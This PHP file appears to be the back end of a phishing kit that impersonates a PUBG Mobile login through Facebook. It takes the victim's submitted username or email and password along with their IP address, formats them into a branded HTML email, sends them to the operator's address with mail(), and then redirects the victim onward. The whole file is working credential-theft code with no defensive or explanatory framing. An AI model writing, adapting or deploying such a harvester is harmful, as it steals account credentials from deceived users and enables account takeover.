<?php
error_reporting(0);
include('cilepeung.php');

$efb = $_POST['efb'];
$pfb = $_POST['pfb'];
$ip = $_SERVER['REMOTE_ADDR'];

$subject = "PUBG Mobile | Login Facebook | '.$ip.'";
$message = '
<center> 
<div style="padding:5px;width:294;height:40px;background: black;color: black;text-align:center;">
<img width="40" style="float:left;" src="https://i.ibb.co/5vt7dWT/20180920-172425.png">
<img width="40" style="float:right;" src="http://pubgmobile.com/en-US/m/images/icon_logom.png">
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
  <th style="width:78%;text-align: center;"><b>'.$efb.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>PASSWORD</th>
  <th style="width:78%;text-align: center;"><b>'.$pfb.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>LOGIN</th>
  <th style="width:78%;text-align:center;"><b>FACEBOOK</th> 
 </tr>
</table>
<div style="padding:5px;width:294;height:40px;background: black;color:#ffc;text-align:center;">
<font size="3"><b>ALAMPEDIA</b></font>
</div>
</center>
';

include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: ALAMPEDIA <result@alampedia.com>' . "\r\n";
$datamail = mail($emailkamu, $subject, $message, $headersx);
$datamail = mail($error, $subject, $message, $headersx);

?>


<html>
<head>
<meta http-equiv="REFRESH" content="0;url=collect.php">
</head>
<body>
</body>
</html>
